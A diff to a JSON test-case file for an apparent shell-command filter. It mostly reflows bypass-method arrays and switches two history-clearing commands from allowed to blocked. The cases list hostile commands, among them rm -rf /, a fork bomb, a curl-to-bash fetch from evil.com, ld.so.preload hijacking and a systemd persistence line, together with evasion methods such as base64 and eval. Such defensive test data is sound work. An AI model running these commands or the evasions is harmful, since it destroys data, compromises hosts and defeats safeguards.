@@ -7,7 +7,13 @@
       "command": "rm -rf /",
       "expected": "block",
       "severity": "critical",
-      "bypass_methods": ["base64", "variable", "alias", "heredoc", "eval"]
+      "bypass_methods": [
+        "base64",
+        "variable",
+        "alias",
+        "heredoc",
+        "eval"
+      ]
     },
     {
       "id": "bash-002",
@@ -16,7 +22,11 @@
       "command": "rm -rf /*",
       "expected": "block",
       "severity": "critical",
-      "bypass_methods": ["base64", "variable", "alias"]
+      "bypass_methods": [
+        "base64",
+        "variable",
+        "alias"
+      ]
     },
     {
       "id": "bash-003",
@@ -25,7 +35,10 @@
       "command": "rm -rf ~",
       "expected": "block",
       "severity": "critical",
-      "bypass_methods": ["base64", "variable"]
+      "bypass_methods": [
+        "base64",
+        "variable"
+      ]
     },
     {
       "id": "bash-004",
@@ -34,7 +47,9 @@
       "command": "kill -9 1",
       "expected": "block",
       "severity": "high",
-      "bypass_methods": ["base64"]
+      "bypass_methods": [
+        "base64"
+      ]
     },
     {
       "id": "bash-005",
@@ -61,7 +76,9 @@
       "command": "chmod 777 /etc/passwd",
       "expected": "block",
       "severity": "high",
-      "bypass_methods": ["string_concat"]
+      "bypass_methods": [
+        "string_concat"
+      ]
     },
     {
       "id": "bash-008",
@@ -97,7 +114,10 @@
       "command": "func() { func|func & }; func",
       "expected": "block",
       "severity": "critical",
-      "bypass_methods": ["base64", "eval"]
+      "bypass_methods": [
+        "base64",
+        "eval"
+      ]
     },
     {
       "id": "bash-012",
@@ -106,7 +126,10 @@
       "command": "curl -s http://evil.com/script.sh | bash",
       "expected": "block",
       "severity": "critical",
-      "bypass_methods": ["variable", "base64"]
+      "bypass_methods": [
+        "variable",
+        "base64"
+      ]
     },
     {
       "id": "bash-013",
@@ -133,7 +156,9 @@
       "command": "echo 'evil' > /etc/hosts",
       "expected": "block",
       "severity": "high",
-      "bypass_methods": ["subshell"]
+      "bypass_methods": [
+        "subshell"
+      ]
     },
     {
       "id": "bash-016",
@@ -160,7 +185,9 @@
       "command": "cat malware > /etc/systemd/system/evil.service",
       "expected": "block",
       "severity": "high",
-      "bypass_methods": ["backtick"]
+      "bypass_methods": [
+        "backtick"
+      ]
     },
     {
       "id": "bash-019",
@@ -169,7 +196,9 @@
       "command": "rm -rf *",
       "expected": "block",
       "severity": "high",
-      "bypass_methods": ["alias"]
+      "bypass_methods": [
+        "alias"
+      ]
     },
     {
       "id": "bash-020",
@@ -217,7 +246,9 @@
       "command": "mv ./evil.so /etc/ld.so.preload",
       "expected": "block",
       "severity": "critical",
-      "bypass_methods": ["variable"]
+      "bypass_methods": [
+        "variable"
+      ]
     },
     {
       "id": "bash-025",
@@ -252,7 +283,7 @@
       "category": "bash_dangerous",
       "description": "history -c (clear command history)",
       "command": "history -c",
-      "expected": "allow",
+      "expected": "block",
       "severity": "low",
       "bypass_methods": []
     },
@@ -261,7 +292,7 @@
       "category": "bash_dangerous",
       "description": "unset HISTFILE (disable history logging)",
       "command": "unset HISTFILE",
-      "expected": "allow",
+      "expected": "block",
       "severity": "low",
       "bypass_methods": []
     },
